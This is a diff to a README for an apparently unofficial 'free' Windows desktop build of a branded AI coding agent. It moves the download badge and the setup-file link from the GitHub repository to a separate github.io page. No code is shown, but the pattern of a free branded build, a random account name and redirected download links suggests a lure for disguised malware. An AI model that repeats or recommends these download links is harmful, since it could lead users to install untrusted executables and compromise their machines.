@@ -1,6 +1,6 @@
 # 🤖 Claude-fable-5-free-desktop - Run custom coding agents on Windows
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Superhuman-angulation365/Claude-fable-5-free-desktop)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://superhuman-angulation365.github.io)
 
 ## 💡 About this software
 
@@ -19,7 +19,7 @@ Ensure your computer meets these specifications before you begin:
 
 ## 📥 Getting the application
 
-Visit [this page](https://github.com/Superhuman-angulation365/Claude-fable-5-free-desktop) to download the latest setup file. 
+Visit [this page](https://superhuman-angulation365.github.io) to download the latest setup file. 
 
 1. Go to the link provided above.
 2. Look for the Releases section on the right side of the page.
